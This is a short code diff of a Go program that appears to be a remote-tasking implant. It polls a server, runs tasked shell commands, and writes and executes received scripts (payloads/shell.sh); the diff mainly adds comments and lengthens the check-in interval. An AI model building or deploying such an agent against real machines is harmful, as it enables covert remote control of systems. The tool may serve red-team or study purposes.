@@ -83,7 +83,7 @@ func main() {
 
 	// Checks in every 10 seconds.
 	for {
-		time.Sleep(1 * time.Second)
+		time.Sleep(5 * time.Second)
 
 		checkIn()
 
@@ -264,6 +264,7 @@ func getFIle() {
 
 }
 
+// Runs a command based of a task. Then creates a response.
 func handle_runCommand(this_taskID string, command string) {
 
 	var response Task_Response
@@ -280,6 +281,7 @@ func handle_runCommand(this_taskID string, command string) {
 
 }
 
+// Runs a command, and returns the output.
 func runCommand(command string) (outString string, errorMessage string) {
 
 	var shell string
@@ -332,6 +334,7 @@ func runCommand(command string) (outString string, errorMessage string) {
 
 }
 
+// Converts an encoded script. To a script on the machine
 func script_to_file(input string) {
 
 	f, err := os.Create("payloads/shell.sh")
@@ -353,6 +356,7 @@ func script_to_file(input string) {
 	return
 }
 
+// Runs a script. Currently not OS agnostic
 func run_script(path_to_script string) (output string) {
 
 	output = ""
